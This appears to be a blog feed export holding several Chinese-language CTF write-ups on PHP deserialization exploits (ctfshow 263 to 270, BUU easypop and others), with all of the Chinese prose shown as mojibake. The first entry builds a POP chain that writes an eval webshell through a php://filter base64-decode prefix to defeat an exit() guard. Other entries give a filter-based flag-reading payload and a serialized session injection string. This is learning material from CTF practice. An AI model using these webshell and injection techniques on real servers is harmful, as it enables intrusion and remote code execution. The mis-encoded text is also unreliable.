class="line"></span><br></pre></td></tr></table></figure><p><strong>é¦–å…ˆçœ‹Aç±»</strong></p><p>å®šä¹‰äº†ä¸‰ä¸ªè¢«ä¿æŠ¤çš„å˜é‡ï¼Œä¹Ÿå°±æ˜ç¡®äº†åªèƒ½åœ¨æœ¬ç±»ä¸­è°ƒç”¨ï¼Œç„¶å<code>__constructæ–¹æ³•</code>ï¼Œåˆå§‹åŒ–</p><p>ç„¶åçœ‹åˆ°<code>cleanContents</code></p><p><code>array_flip</code>åè½¬æ•°ç»„ä¸­æ‰€æœ‰çš„é”®ä»¥åŠä»–ä»¬å…³è”çš„å€¼</p><p><code>array_intersert_key</code>,æ¯”è¾ƒä¸¤ä¸ªæ•°ç»„çš„é”®åï¼Œå¹¶è¿”å›äº¤é›†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public function getForStorage() &#123;</span><br><span class="line">       $cleaned &#x3D; $this-&gt;cleanContents($this-&gt;cache);</span><br><span class="line">       return json_encode([$cleaned, $this-&gt;complete]);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œæˆ‘ä»¬çœ‹åˆ°ç±»saveä¸­è°ƒç”¨äº†ä¸€ä¸ªsetå‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬ä¼šå‘ç°Aç±»ä¸­å¹¶æ²¡æœ‰saveå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥åˆ°äº†Bç±»</p><p>ç›´æ¥å…ˆæ¥çœ‹setå‡½æ•°æŠŠ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public function set($name, $value, $expire &#x3D; null): bool&#123;</span><br><span class="line">       $this-&gt;writeTimes++;</span><br><span class="line">       if (is_null($expire)) &#123;</span><br><span class="line">           $expire &#x3D; $this-&gt;options[&#39;expire&#39;];</span><br><span class="line">       &#125;</span><br><span class="line">       $expire &#x3D; $this-&gt;getExpireTime($expire);</span><br><span class="line">       $filename &#x3D; $this-&gt;getCacheKey($name);</span><br><span class="line">       $dir &#x3D; dirname($filename);</span><br><span class="line">       if (!is_dir($dir)) &#123;</span><br><span class="line">           try &#123;</span><br><span class="line">               mkdir($dir, 0755, true);</span><br><span class="line">           &#125; catch (\Exception $e) &#123;</span><br><span class="line">               &#x2F;&#x2F; åˆ›å»ºå¤±è´¥</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       $data &#x3D; $this-&gt;serialize($value);</span><br><span class="line">       if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;</span><br><span class="line">           &#x2F;&#x2F;æ•°æ®å‹ç¼©</span><br><span class="line">           $data &#x3D; gzcompress($data, 3);</span><br><span class="line">       &#125;</span><br><span class="line">       $data &#x3D; &quot;&lt;?php\n&#x2F;&#x2F;&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</span><br><span class="line">       $result &#x3D; file_put_contents($filename, $data);</span><br><span class="line">       if ($result) &#123;</span><br><span class="line">           return true;</span><br><span class="line">       &#125;</span><br><span class="line">       return false;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¼ å…¥ä¸‰ä¸ªå‚æ•°$name, $value, $expire = nullï¼Œæ‰€ä»¥ç°åœ¨æ¥è¯´nameå°±æ˜¯keyï¼Œvalueå°±æ˜¯contentsï¼Œexpireè¢«å¼ºåŒ–ä¸ºnull</p><pre><code>    if (is_null($expire)) &#123;        $expire = $this-&gt;options[&#39;expire&#39;];    &#125;</code></pre><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ‰€ä»¥expireçš„å€¼æ˜¯æˆ‘ä»¬å¯æ§çš„</p><pre><code>    $expire = $this-&gt;getExpireTime($expire);</code></pre><p>Â·</p><pre><code>     protected function getExpireTime($expire): int &#123;    return (int) $expire;&#125;</code></pre><p>ä½†æ˜¯è¿™é‡ŒåˆæŠŠexpireè½¬åŒ–ä¸ºintç±»å‹ï¼Œæˆ‘æ„Ÿè§‰å¯¹æˆ‘ä»¬æš‚æ—¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©</p><pre><code>    $filename = $this-&gt;getCacheKey($name);</code></pre><p>Â·</p><pre><code>    public function getCacheKey(string $name): string &#123;    return $this-&gt;options[&#39;prefix&#39;] . $name;&#125;</code></pre><p>è¿”å›äº†ä¸€ä¸ªæ‹¼æ¥å€¼</p><pre><code>    $dir = dirname($filename);</code></pre><li>dirname() å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚<p>ä¾‹å­```&lt;?php<br>echo dirname(â€œc:/testweb/home.phpâ€);</p><p>echo dirname(â€œ/testweb/home.phpâ€);<br>?&gt;```</p><p>è¾“å‡º`c:/testweb</p><p>/testweb`</p><pre><code>    $data = $this-&gt;serialize($value);</code></pre><p>valueå°±æ˜¯contentä¼ å…¥çš„å€¼</p><pre><code>     protected function serialize($data): string &#123;    if (is_numeric($data)) &#123;        return (string) $data;    &#125;    $serialize = $this-&gt;options[&#39;serialize&#39;];    return $serialize($data);&#125;</code></pre><p>æœ€åä¸€ä¸ª$serialize($data)ï¼Œè¿™æ˜¯ä¸ªå•¥ï¼Ÿï¼Ÿï¼Ÿ</p><pre><code>    $data = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;    $result = file_put_contents($filename, $data);</code></pre><p>å¦‚æœå°±æ˜¯filenameæ˜¯ä¸ªè·¯å¾„ï¼Œdataæ˜¯ä¸ªæ–‡ä»¶åï¼Œç„¶åï¼Œé‡ç‚¹æ˜¯ï¼Œè¿™æœ‰ä¸€ä¸ªæ­»äº¡exitï¼Œ<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list">Pç¥çš„æ–‡ç« </a></p><p>å¤§æ¦‚æ€è·¯æ¸…ç†ä¸€ä¸‹</p><p>new class Aï¼Œç„¶åè§¦å‘__destruct(),å› ä¸ºå°±æ²¡æœ‰autosaveè¿™ä¸ªä¸œè¥¿ï¼Œæ‰€ä»¥è§¦å‘save</p><p>æ§åˆ¶cacheï¼Œcacheå¯ä»¥æ˜¯ â€˜pathâ€™, â€˜dirnameâ€™, â€˜basenameâ€™, â€˜extensionâ€™, â€˜filenameâ€™,â€™sizeâ€™, â€˜mimetypeâ€™, â€˜visibilityâ€™, â€˜timestampâ€™, â€˜typeâ€™ã€‚</p><p>ç„¶åæ§åˆ¶completeï¼Œè¿”å›jsonä¸²ï¼Œå¦å¤–keyçš„å€¼ä¹Ÿæ˜¯å¯ä»¥æ”¹å˜çš„ï¼Œç„¶åä¹æ˜¯filenameï¼Œè¿˜æœ‰dataï¼Œå»ä½¿ç”¨file_name_contents,å¾—åˆ°flag</p><p>ç„¶åä¹ä¸ä¼šäº†ï¼Œç°åœ¨è¦æƒ³çš„å°±æ˜¯æ€ä¹ˆç»•è¿‡æ­»äº¡exitï¼ˆï¼‰ï¼ŒPç¥æ›°ï¼šç”±äº&lt;ã€?ã€()ã€;ã€&gt;ã€\néƒ½ä¸æ˜¯base64ç¼–ç çš„èŒƒå›´ï¼Œæ‰€ä»¥base64è§£ç çš„æ—¶å€™ä¼šè‡ªåŠ¨å°†å…¶å¿½ç•¥ï¼Œæ‰€ä»¥è§£ç ä¹‹åå°±å‰©php//exitäº†ï¼Œè¿™é‡Œæœ‰9ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯å‘¢base64ç®—æ³•è§£ç æ—¶æ˜¯4ä¸ªå­—èŠ‚ä¸€ç»„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦åœ¨å‰é¢åŠ äº›å­—ç¬¦ï¼Œæˆ‘å°±åŠ 3ä¸ªå­—ç¬¦å§ï¼Œæœ€åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨phpä¼ªåè®®æ¥ç»•è¿‡ï¼Œä¸€ä¼šå†™åœ¨è·¯å¾„é‡Œå°±è¡Œ</p><pre><code>    php://filter/write=convert.base64-decode/resource=    sprintf(&#39;%012d&#39;, $expire)</code></pre><p>æˆ‘å®éªŒäº†ä¸€ä¸‹ï¼Œ%012d,ä¸ç®¡expireæ˜¯ä»€ä¹ˆéƒ½ä¼šè¡¥ä¸º12ä¸ªæ•°ï¼Œæ­£å¥½æ˜¯4çš„å€æ•°ï¼Œæ‰€ä»¥æ²¡æœ‰ä»€ä¹ˆå½±å“</p><p> dataæ¥å†™shellï¼ŒåŠ ä¸Š3ä¸ªå­—ç¬¦ï¼Œå°±åƒåˆšæ‰æ‰€è¯´ï¼Œdata-&gt;value-&gt;contentsï¼ˆjsonå½¢åŠ¿ï¼‰-&gt;cache</p><p>jsonæ ¼å¼çš„å­—ç¬¦éƒ½ä¸æ»¡è¶³base64ç¼–ç çš„è¦æ±‚ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†æ•°æ®è¿›è¡Œbase64ç¼–ç ç»•è¿‡</p><p><img src="1.PNG"></p><pre><code>    A-&gt;complete=base64_encode(&#39;xxx&#39;,base64_encode(&#39;&lt;?php @eval($_POST[&quot;ro4lsc&quot;]);?&gt;&#39;))  //è¿™é‡Œçš„xxxå°±æ˜¯ä¸ºäº†å’Œphp//exitä¸€èµ·å‡‘å¤Ÿ4çš„å€æ•°</code></pre><p>ç°åœ¨æœ€é‡è¦çš„é—®é¢˜æ˜¯æ€ä¹ˆæŠŠbase64ä¸¤æ¬¡è§£ç ï¼Œä¸€æ¬¡è§£ç å·²ç»å†³å®šåœ¨è·¯å¾„é‡Œç”¨phpåè®®è§£ç ä¸€æ¬¡ï¼Œé‚£è¿˜æœ‰ä¸€æ¬¡å¾—å†æ‰¾æ–¹æ³•è§£ç <br>è¿™æ—¶æˆ‘ä»¬å°±å¾—çœ‹åˆ°å‰é¢æåˆ°çš„serializeå‡½æ•°</p><pre><code>     protected function serialize($data): string &#123;    if (is_numeric($data)) &#123;        return (string) $data;    &#125;    $serialize = $this-&gt;options[&#39;serialize&#39;];    return $serialize($data);&#125;</code></pre><p>å¯ä»¥çœ‹åˆ°è¿”å›å€¼æ˜¯ s e r i a l i z e ( serialize( serialize(data)ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œæˆ‘ä»¬å¯ä»¥è®©è¿™ä¸ªå˜é‡$serilalizeä¸ºbase64_decodeå‡½æ•°å¯¹dataå˜é‡è¿›è¡Œè§£ç ã€‚(è§£ç­”æˆ‘ä¸Šé¢çš„ç–‘æƒ‘äº†ï¼ï¼ï¼ï¼)</p><p>filenameå‚æ•°æ˜¯options[â€˜prefixâ€™]å’Œ n a m e è¿› è¡Œ æ‹¼ æ¥ çš„ ç»“ æœ ï¼Œ è€Œ è¿™ é‡Œ çš„ nameè¿›è¡Œæ‹¼æ¥çš„ç»“æœï¼Œè€Œè¿™é‡Œçš„ nameè¿›è¡Œæ‹¼æ¥çš„ç»“æœï¼Œè€Œè¿™é‡Œçš„nameæ˜¯å½¢å‚ï¼Œæ‰€ä»¥è¿™ä¸ª$nameæ˜¯Aç±»çš„keyå˜é‡ï¼Œæ˜¯ç”±saveå‡½æ•°ä¼ é€’è¿‡æ¥çš„<br>ç”±äºoptions[â€˜prefixâ€™]å¯æ§</p><pre><code>    options[&#39;prefix&#39;]=&quot;php://filter/write=convert.base64-decode/resource=&quot;;    key=&quot;webshell.php&quot;; //$name</code></pre><p>Â·</p><pre><code>    A::__destruct-&gt;save()-&gt;getForStorage()-&gt;cleanStorage()       B::save()-&gt;set()-&gt;getExpireTime()ï¼ŒgetCacheKey()ï¼Œserialize()-&gt;file_put_contentså†™å…¥shell</code></pre><p>Â·</p><pre><code>    key-&gt;name-&gt;filename       //keyå¯æ§    cache-&gt;clean+complete-&gt;contents-&gt;value-&gt;data    //cacheå’Œcompleteå¯æ§    expire   //expireå¯æ§</code></pre><p><img src="2.PNG"></p><p>è®¿é—®shell.php</p><p>åˆšæ‰åœ¨æƒ³ä¸€ä¸ªé—®é¢˜options[â€˜prefixâ€™]=â€php://filter/write=convert.base64-decode/resource=â€; key=â€webshell.phpâ€;ï¼Œä¸ºç¤¾ä¹ˆè¦è¿™æ ·å†™ï¼Œå°±æ˜¯ç›¸å½“äºæ‹¼æ¥äº†ä¸€ä¸ªä¼ªåè®®åœ¨æ–‡ä»¶çš„å‰é¢ï¼Œä¾¿äºè§£ç </p><p><img src="1.PNG"></p><p>#åè®°</p><p>æ„Ÿè§‰è¿™é“é¢˜åªåšä¸€æ¬¡å¹¶æ²¡æœ‰å®Œå…¨çš„åƒé€ï¼Œæ„Ÿè§‰è¿˜è¦å†æ¥ä¸€æ¬¡ï¼Œä»£ç å®¡è®¡ç¡®å®å¤ªç´¯äº†ï¼Œè¿™ä¹ˆé•¿çš„ä»£ç ç›´æ¥ç»™æˆ‘æ•´è’™äº†ï¼Œä¸€å¼€å§‹çš„æ—¶å€™</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow  267-270</title>
      <link href="/2021/03/15/267-270/"/>
      <url>/2021/03/15/267-270/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><span id="more"></span><p>å¤ç°yii2  <a href="https://www.cnblogs.com/thresh/p/13743081.html">https://www.cnblogs.com/thresh/p/13743081.html</a></p><p>267</p><p>æ‰“å¼€åå¯ä»¥çœ‹éƒ½æœ‰ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œå¼±å¯†ç çˆ†ç ´ï¼ˆå› ä¸ºæˆ‘æŠŠyii2å¤ç°äº†ï¼Œçœ‹åˆ°é‡Œé¢çš„ç”¨æˆ·åå¯†ç ï¼Œæœ‰ä¸¤ä¸ªï¼Œadmin,adminå’Œdemoï¼Œdemoï¼‰</p><p>ä¸¤ä¸ªéƒ½å¯ä»¥æˆåŠŸç™»å½•</p><p>æ‰“å¼€aboutï¼Œé‡Œé¢æœ‰ä¸€ä¸ªview-source,è¿™é‡Œæœ‰ç‚¹å¥‡æ€ªæ˜¯æ„é€  r=   &amp;view-source</p><p>/backdoor/shell<br>unserialize(base64_decode($_GET[â€˜codeâ€™])),ç„¶åå¯ä»¥çœ‹åˆ°è¿™ä¸ªæç¤º</p><p><img src="1.PNG"></p><p>è¿™é‡Œçš„è¿™ä¸ªpassthruï¼Œè·Ÿsystemä¸€æ ·ä½†æ˜¯systemè¢«è¿‡æ»¤äº†å°±ä¸è¡Œäº†</p><p>268</p><p>flagè¢«è¿‡æ»¤ï¼Œæ”¹ä¸ºfl*</p><p>269</p><p>åŒ268</p><p>270</p><p>ç”¨poc4ï¼Œå°±å¯ä»¥äº†</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buueasypop</title>
      <link href="/2021/03/14/buueasypop/"/>
      <url>/2021/03/14/buueasypop/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>ç¬¬ä¸€æ¬¡åšçš„æ—¶å€™ï¼Œæå¾—ä¸æ˜¯ç‰¹åˆ«æ‡‚ï¼Œç°åœ¨æŠŠé¢˜ç›®åœ¨ç»†ç»†çš„æ‰£ä¸€æ‰£</p><span id="more"></span><p>é¢˜ç›®æºç </p><p><img src="1.PNG"></p><p>å…ˆåˆ†æä¸‹ï¼Œé¢˜ç›®æœ‰è¯´flagåœ¨flag.phpä¸­ï¼Œè€Œä¸”æ•´ä¸ªä»£ç çš„æ¼æ´å°±åœ¨Modifierè¿™ä¸ªç±»ä¸­ï¼Œæœ‰ä¸ªincludeï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ªåè®®è¯»å–flag.php,è¿™é‡Œæœ‰ä¸€ä¸ªé­”æœ¯æ–¹æ³•/_/<em>invoke(å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œè¯¥æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨).,è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨ç±»Testä¸­ï¼Œæœ‰ä¸€ä¸ªreturn $function();æ‰€ä»¥è¿™é‡Œå°±æ˜¯æˆ‘ä»¬è§¦å‘invokeçš„å…³é”®ï¼Œä½†æ˜¯é—®é¢˜æ˜¯æˆ‘ä»¬è¦æ€æ ·æ‰èƒ½è§¦å‘Testè¿™ä¸ªç±»è®·ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨Testä¸­æœ‰ä¸€ä¸ªé­”æœ¯æ–¹æ³•/</em>/_get,getæ–¹æ³•åœ¨å®˜ç½‘ä¸Šæ‰¾åˆ°çš„æ˜¯å¦‚æœåœ¨ç±»å¤–é¢è°ƒç”¨ä¸€ä¸ªç§æœ‰å±æ€§çš„è¯ä¼šè§¦å‘è¿™ä¸ªå‡½æ•°ï¼Œä½†æ˜¯å®é™…ä¸Šå¦‚æœè°ƒç”¨ç±»é‡Œé¢ä¸å­˜åœ¨çš„å±æ€§ä¹Ÿä¼šè§¦å‘ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨Showè¿™ä¸ªç±»é‡Œé¢æœ‰ä¸€ä¸ª__tostring()é­”æœ¯æ–¹æ³•ï¼Œè¿™ä¸ªæ˜¯å¦‚æœå½“ä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²çš„æ—¶å€™å°±ä¼šè§¦å‘ã€‚æ‰€ä»¥ç»¼ä¸Šæˆ‘ä»¬åç€æ¥</p><p>1.è§¦å‘tostring<br>2.è§¦å‘get<br>3.è§¦å‘invoke<br>4.ä¼ªåè®®è¯»å–</p><p>å…ˆä¸€æ­¥æ­¥çš„æ¢ç´¢</p><p>1.å¦‚ä½•è§¦å‘get</p><p><img src="2.PNG"></p><p>è§£é‡Šä¸€ä¸‹exp</p><p>å…ˆnew Show,æŠŠå¯¹è±¡å®ä¾‹åŒ–ç„¶åèµ‹ç»™aï¼Œaç»™strèµ‹å€¼ä¸ºnew Test(),ç„¶ååœ¨æŠŠ$aå½“ä½œå­—ç¬¦ä¸²ä¼ å…¥ï¼Œè¿™æ—¶å€™wakeup()è¿™å°±å¯ä»¥è§¦å‘äº†ï¼Œç„¶ååœ¨tostringè¿™é‡Œå› ä¸ºsourceä¸æ˜¯Testä¸­çš„å±æ€§ï¼Œæ‰€ä»¥æˆåŠŸè§¦å‘geté­”æœ¯æ–¹æ³•</p><p>ç„¶å</p><p><img src="3.PNG"></p><p>ammmmä¸æƒ³åˆ†æäº†ï¼Œä½†æ˜¯è®°å¾—è®°å¾—ï¼Œphp://filter/read=convert.base64-encode/resource=flag.php,è¿™é‡Œflag.phpä¸èƒ½åŠ å¼•å·ï¼ï¼ï¼ï¼</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>henu mai</title>
      <link href="/2021/03/14/mai/"/>
      <url>/2021/03/14/mai/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><p>å­¦ä¹ ååºåˆ—åŒ–ä¹‹åï¼Œæ‰“å¼€äº†é‚£é“ä¸Šæ˜ŸæœŸè®©æˆ‘å¤´è’™äº†3ä¸ªå°æ—¶çš„é¢˜ç›®ï¼Œå…¶å®ç°åœ¨çœ‹è¿˜æŒºç®€å•çš„ï¼Œä¸»è¦å½“æ—¶å°±æ²¡æœ‰å¬è¯´è¿‡popé“¾è¿™ä¸ªè¯å°±ã€‚</p><span id="more"></span><p>æˆ‘å½“æ—¶åšçš„æ—¶å€™ï¼Œåªæ˜¯çŸ¥é“å½“æŠŠç±»å½“ä½œå­—ç¬¦ä¸²è¾“å‡ºçš„æ—¶å€™ä¼šè§¦å‘__tostring()è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œä½†æ˜¯å› ä¸ºé¢˜ç›®å¹¶æ²¡æœ‰ç»™echoï¼Œæ‰€ä»¥å½“æ—¶å°±å¡åœ¨è¿™é‡Œäº†</p><p>å…¶å®å½“ç±»è¢«å½“æˆå­—ç¬¦ä¸²å°±ä¼šè§¦å‘tostringè¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæ‰€ä»¥è§¦å‘ç‚¹å°±åœ¨flagè¿™ä¸ªç±»çš„__wake upè¿™ä¸ªé­”æœ¯æ–¹æ³•è¿™é‡Œ</p><p>å½“æ—¶æˆ‘è¿˜å¥‡æ€ªæ¥ç€ï¼Œä¸ºæ’’å­è¿™é‡Œè¦æœ‰ä¸ªæ¯”è¾ƒï¼Œ</p><p><img src="1.PNG"></p><p>å¾ˆæ˜¯è«åå…¶å¦™ï¼Œç°åœ¨çœ‹æ¥å°±æ˜¯è¿™é‡Œï¼Œå¦‚æœæˆ‘ä»¬ä»¤$this-&gt;baby=new baby()ï¼Œå°±å¯ä»¥è§¦å‘tostringï¼Œäºæ˜¯æˆ‘ä»¬æ„é€ </p><p><img src="2.PNG"></p><p>å°±å¾—åˆ°key</p><p>key:mishenyyds</p><p>äºæ˜¯ä¸‹é¢å°±ç®€å•äº†</p><p><img src="3.PNG"></p><p><img src="4.PNG"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ååºåˆ—åŒ– ctfshow 265</title>
      <link href="/2021/03/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%AC%E4%B8%89%E5%BC%B9/"/>
      <url>/2021/03/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%AC%E4%B8%89%E5%BC%B9/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><span id="more"></span><p>265</p><p><img src="1.PNG"></p><p>é¢˜ç›®æ„æ€å¾ˆç®€å•å°±æ˜¯ï¼Œtoken==password,å³å¯</p><p>ä½†æ˜¯tokenæˆ‘ä»¬ä¹Ÿæœ‰çœ‹åˆ°$ctfshow-&gt;token=md5(mt_rand());ï¼Œtokenè¢«éšæœºèµ‹äº†ä¸€ä¸ªå€¼</p><p>æ‰€ä»¥å°±å¼•å…¥äº†ä¸€ä¸ªæ–°çš„çŸ¥è¯† &amp;</p><p>å…ˆçœ‹ä¸€ä¸ªå®éªŒ</p><p><img src="2.PNG"></p><p>æˆ‘ä»¬ä¼šå‘ç°açš„å€¼ä¼šè·Ÿç€bæ”¹å˜ï¼Œäºæ˜¯æˆ‘ä»¬æ„é€ </p><p><img src="3.PNG"></p><p>å¾—åˆ°flag<br>å¦å¤–æ³¨æ„ä¸è¦ public $token=&amp;$password,ä¼šå‡ºç°æŠ¥é”™</p><p>266</p><p>ä¸€ä¸ªç‚¹ï¼Œphpå¤§å°å†™ï¼šå‡½æ•°åå’Œç±»åä¸åŒºåˆ†ï¼Œä½†æ˜¯å˜é‡ååŒºåˆ†</p><p>å…¶å®è¿™é¢˜æŒºç®€å•çš„</p><p><img src="4.PNG"></p><p>bpï¼Œhackbarä¼ å‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ååºåˆ—åŒ– ctfshow 263 264</title>
      <link href="/2021/03/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%AC%E4%BA%8C%E5%BC%B9/"/>
      <url>/2021/03/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%AC%E4%BA%8C%E5%BC%B9/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><span id="more"></span><p>php-sessionååºåˆ—åŒ–</p><p>å‰ç½®çŸ¥è¯†</p><p>phpä¸­çš„sessionä¸æ˜¯å­˜åœ¨å†…å­˜ä¸­çš„ï¼Œè€Œæ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼è¿›è¡Œå­˜å‚¨ï¼Œé…ç½®é¡¹session.save_handleræ¥å†³å®šï¼Œä»¥session_sessionidæ¥è¿›è¡Œå‘½å</p><li>php  é»˜è®¤ä»¥æ­¤æ–¹å¼è¿›è¡Œå‘½åï¼Œé”®å|ç»è¿‡serailizeå‡½æ•°è¿›è¡Œå¤„ç†çš„<li>php_serailize   ç»è¿‡serialize()å‡½æ•°ååºåˆ—åŒ–çš„æ•°ç»„<li>php_binary   é”®åçš„é•¿åº¦å¯¹å¯¹åº”çš„ASCIIå­—ç¬¦ï¼Œé”®åï¼Œserializeåºåˆ—åŒ–å¤„ç†çš„å€¼<p>php.iniä¸­çš„ä¸€äº›é…ç½®</p><p>session.save_path=â€â€ ä¸€äº›sessionçš„å­˜å‚¨è·¯å¾„</p><p>session.save_handler=â€â€ è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœä½¿ç”¨phpå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨è¯¥å‡½æ•°</p><p>session.auto_start boolen æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹çš„æ—¶å€™å¯åŠ¨ä¸€ä¸ªä¼šè¯ï¼Œé»˜è®¤ä¸å¯åŠ¨ï¼Œ0</p><p>session.serialize_handler stringâ€“å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨php</p><p>ä»Šå¤©å­¦ä¼šäº†ä¸€ä¸ªæ–°çš„å·¥å…·ï¼Œseayä»£ç å®¡è®¡ï¼Œè™½ç„¶å¯¹è¿™é“é¢˜æ²¡æœ‰å¤ªå¤§çš„å¸®åŠ©ï¼Œä½†çœŸçš„å¤ªiäº†ï¼Œæˆ‘æœ¬æ¥ä»£ç å®¡è®¡å°±ç‰¹åˆ«å¼±ã€‚ä¸è¿‡è¿˜æ˜¯è¦åŠ å¼ºè‡ªå·±å®¡è®¡çš„èƒ½åŠ›ã€‚</p><p>é¢˜ç›®æ‰“å¼€æ˜¯ç™»å½•é¡µé¢ï¼Œå•¥éƒ½æ²¡æœ‰å°±æ‰«ç›®å½•ï¼Œ<a href="http://www.zip/">www.zip</a></p><p><img src="1.PNG"></p><p>æˆ‘ä»¬è®¿é—®index.phpç½‘é¡µåï¼Œå°±ä¼šæŠŠæˆ‘ä»¬è®¿é—®çš„ä¿¡æ¯å†™å…¥cookieï¼Œbase64ç¼–ç çš„</p><p>åœ¨check.phpæç¤ºæˆ‘ä»¬</p><p><img src="2.PNG"></p><p>å¯ä»¥çœ‹åˆ°inc.php,ä¸­æœ‰</p><p><img src="3.PNG"></p><p>æ‰€ä»¥çŒœæµ‹ï¼Œè¿™åº”è¯¥æ˜¯æœ‰php_serailizeï¼Œæ–¹å¼å­˜åœ¨çš„ã€‚è¿™åº”è¯¥å°±æ˜¯æˆ‘ä»¬çš„æ³¨å…¥ç‚¹</p><p><img src="4.PNG"></p><p>çœ‹åˆ°è¿™é‡Œçš„file_get_contents</p><p><img src="5.PNG"></p><p>å®¡è®¡æŠ¥å‘Šé‡Œä¹Ÿè¯´æ˜äº†ï¼Œè¿™é‡Œå­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p><p><img src="6.PNG"></p><p>è¿™æ ·çš„è¯ï¼Œå½“æˆ‘ä»¬åœ¨è®¿é—®check.phpçš„æ—¶å€™ï¼Œå°±ä¼šç”Ÿæˆlog-1.php</p><p>å¦å¤–ï¼Œå¦‚æœåŒæ—¶å‡ºç°php,php serializeè¿™ä¸¤ç§å­˜å‚¨æ–¹å¼ï¼Œé‚£ä¹ˆä¼šå‡ºç°é”™ä¹±ï¼Œåšä¸ªå®éªŒ</p><p>shiyan.php</p><p><img src="7.PNG"></p><p>flag.php</p><p><img src="8.PNG"></p><p>ååºåˆ—åŒ–</p><p><img src="9.PNG"></p><p>æˆ‘ä»¬åœ¨shiyanã€‚phpè¾“å…¥?a=|O:4:â€testâ€:1:{s:4:â€nameâ€;s:4:â€hahaâ€;}</p><p>æŸ¥çœ‹flag.php</p><p>è¾“å‡ºhaha</p><p>ç”±äº1.phpæ˜¯ä½¿ç”¨php_serializeå¼•æ“å¤„ç†ï¼Œå› æ­¤åªä¼šæŠŠâ€™|â€™å½“åšä¸€ä¸ªæ­£å¸¸çš„å­—ç¬¦ã€‚ç„¶åè®¿é—®2.phpï¼Œç”±äºç”¨çš„æ˜¯phpå¼•æ“ï¼Œå› æ­¤é‡åˆ°â€™|â€™æ—¶ä¼šå°†ä¹‹çœ‹åšé”®åä¸å€¼çš„åˆ†å‰²ç¬¦ï¼Œä»è€Œé€ 